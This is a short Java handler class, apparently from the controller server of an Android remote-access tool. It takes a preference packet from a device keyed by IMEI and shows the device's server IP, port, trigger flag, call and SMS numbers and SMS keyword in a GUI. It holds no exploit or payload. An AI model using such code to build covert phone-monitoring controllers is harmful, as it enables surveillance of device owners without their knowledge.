package handler;

import gui.GUI;
import server.Server;
import Packet.Packet;
import Packet.PreferencePacket;

public class PreferenceHandler  implements PacketHandler {
	
	private GUI gui;
	private int channel;
	private String imei;
	
	public PreferenceHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Preference data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		PreferencePacket packet = (PreferencePacket) p;
		gui.updatePreference(imei, packet.getIp(), packet.getPort(), packet.isWaitTrigger(), packet.getPhoneNumberCall(), packet.getPhoneNumberSMS(), packet.getKeywordSMS());
	}

}
